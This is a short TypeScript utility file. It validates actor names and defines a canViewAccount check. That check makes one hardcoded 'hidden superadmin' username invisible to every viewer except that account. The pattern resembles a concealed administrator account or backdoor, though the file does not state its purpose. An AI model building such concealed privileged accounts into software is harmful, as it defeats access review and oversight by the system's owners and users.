export const ACTOR_NAME_MAX_LENGTH = 100
export const HIDDEN_SUPERADMIN_USERNAME = 'arrow7440'

export function normalizeActorName(value: unknown): { value?: string; error?: string } {
  if (typeof value !== 'string') return { error: 'Actor name must be text' }
  const actorName = value.trim()
  if (!actorName) return { error: 'Actor name is required' }
  if (actorName.length > ACTOR_NAME_MAX_LENGTH) {
    return { error: `Actor name must be ${ACTOR_NAME_MAX_LENGTH} characters or fewer` }
  }
  return { value: actorName }
}

export function canViewAccount(viewerUsername: string, accountUsername: string): boolean {
  return accountUsername.toLowerCase() !== HIDDEN_SUPERADMIN_USERNAME
    || viewerUsername.toLowerCase() === HIDDEN_SUPERADMIN_USERNAME
}
